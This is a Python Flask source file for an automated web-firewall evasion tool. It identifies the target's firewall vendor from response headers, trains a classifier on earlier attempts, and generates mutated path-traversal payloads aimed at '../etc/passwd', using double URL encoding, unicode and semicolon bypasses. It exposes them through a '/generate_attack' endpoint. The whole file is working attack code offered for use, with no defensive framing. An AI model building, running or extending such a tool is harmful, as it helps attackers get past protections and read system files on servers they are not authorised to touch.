from flask import Flask, request, jsonify
import numpy as np
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
import joblib
import random
import os
import json

app = Flask(__name__)

# --- GLOBAL AI STATE ---
experience_buffer = []
model = None
tfidf = TfidfVectorizer(analyzer='char', ngram_range=(2, 4))
encodings = ["none", "url_double", "unicode", "null_byte", "semicolon_bypass"]

# --- WAF FINGERPRINTER ---
class WAFFingerprinter:
    def __init__(self):
        self.signatures = {
            "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "cloudfront": ["x-amz-cf-id", "cloudfront", "via"],
            "akamai": ["x-akamai-transformed", "akamai"],
            "nginx": ["nginx"],
            "sucuri": ["x-sucuri-id", "sucuri"],
            "imperva": ["x-iinfo", "incap-ses", "visid_incap"]
        }

    def identify(self, headers_obj):
        header_str = str(headers_obj).lower()
        for waf, patterns in self.signatures.items():
            if any(p in header_str for p in patterns):
                return waf
        return "generic"

fingerprinter = WAFFingerprinter()

# --- HELPER: Evolutionary Sorting ---
def get_top_parents(buffer, n=3):
    if not buffer:
        return ["../etc/passwd"]
    def score_entry(e):
        base = e.get('latency_ms', 0)
        if e.get('status_code') in [200, 500] or str(e.get('waf_reaction_code')) in ['341', '344']:
            base += 10000 
        return base
    sorted_buffer = sorted(buffer, key=score_entry, reverse=True)
    return [e['payload'] for e in sorted_buffer[:n]]

# --- AI CORE: TRAINING & CONTEXT SAVING ---
def train_agent(data_list, context_name):
    global tfidf, model
    df = pd.DataFrame(data_list)
    
    # 1. Feature Engineering
    payload_vectors = tfidf.fit_transform(df['payload'].fillna(''))
    waf_scores = df['waf_reaction_code'].astype(float).values.reshape(-1, 1)
    latencies = np.log1p(df['latency_ms'].astype(float)).values.reshape(-1, 1)
    X = np.hstack((payload_vectors.toarray(), waf_scores, latencies))
    
    # 2. Proximity Labels
    y = []
    for _, row in df.iterrows():
        score = 0.0
        if row['status_code'] in [200, 500]: score = 1.0
        elif str(row['waf_reaction_code']) in ['341', '344']: score = 0.8
        elif row['latency_ms'] > 2000: score = 0.4
        y.append(1 if score > 0.3 else 0)
    
    if sum(y) == 0: y[0] = 1 # Prevent model crash

    # 3. Training
    clf = RandomForestClassifier(n_estimators=100)
    clf.fit(X, y)
    
    # 4. SAVE BY CONTEXT (Your specific request)
    path = f"models/{context_name}/"
    if not os.path.exists(path): os.makedirs(path)
    
    joblib.dump(clf, f"{path}model.pkl")
    joblib.dump(tfidf, f"{path}tfidf.pkl")
    
    # Also update global for immediate use and bootstrap persistence
    joblib.dump(clf, 'active_waf_model.pkl')
    joblib.dump(tfidf, 'active_tfidf.pkl')
    
    with open(f"{path}history.json", 'w') as f:
        json.dump(data_list, f)
        
    print(f"[*] Brain updated and saved for context: {context_name.upper()}")
    return clf

# --- ROUTES ---

@app.route('/analyze', methods=['POST'])
def handle_training():
    global experience_buffer, model
    data = request.json
    if not isinstance(data, list): data = [data]
    
    current_context = "generic"
    for entry in data:
        resp_headers = entry.get('headers', {})
        context = fingerprinter.identify(resp_headers)
        entry['context'] = context
        experience_buffer.append(entry)
        current_context = context
        
    context_data = [e for e in experience_buffer if e['context'] == current_context]
    model = train_agent(context_data, current_context)
        
    return jsonify({"status": "learning_updated", "context": current_context})

def create_hybrid(base_payload):
    tech = random.choice(encodings)
    if tech == "url_double": return base_payload.replace("/", "%252f")
    if tech == "semicolon_bypass": return base_payload.replace("/", ";/")
    if tech == "unicode": return base_payload.replace("/", "%u2215")
    return base_payload + "/."

@app.route('/generate_attack', methods=['GET'])
def generate_attack():
    global model, tfidf, experience_buffer
    context = fingerprinter.identify(request.headers)
    
    context_path = f"models/{context}/history.json"
    if os.path.exists(context_path):
        with open(context_path, 'r') as f:
            local_buffer = json.load(f)
        parents = get_top_parents(local_buffer)
    else:
        parents = ["../etc/passwd"]

    if model is None:
        return jsonify({"payload": random.choice(parents), "note": "initial_random"})

    candidates = [create_hybrid(random.choice(parents)) for _ in range(100)]
    vectors = tfidf.transform(candidates).toarray()
    meta = np.tile([0, np.log1p(500)], (100, 1))
    X_test = np.hstack((vectors, meta))
    
    probs_all = model.predict_proba(X_test)
    probs = probs_all[:, 1] if probs_all.shape[1] > 1 else 1 - probs_all[:, 0]
    
    best_idx = np.argmax(probs)
    return jsonify({
        "payload": candidates[best_idx],
        "confidence": f"{probs[best_idx]:.2%}",
        "context": context
    }) 

# --- STARTUP ENGINE ---
if __name__ == "__main__":
    # --- BOOTSTRAP THE BRAIN (Your specific request) ---
    print("[*] Checking for existing brain on disk...")
    try:
        if os.path.exists('active_waf_model.pkl') and os.path.exists('active_tfidf.pkl'):
            model = joblib.load('active_waf_model.pkl')
            tfidf = joblib.load('active_tfidf.pkl')
            print("[+] SUCCESS: Brain loaded from disk. Ready to hunt.")
        else:
            print("[!] No brain found. Waiting for first training samples...")
    except Exception as e:
        model = None
        print(f"[!] Load error: {e}. Starting fresh.")

    app.run(host='127.0.0.1', port=5000, debug=True)
 
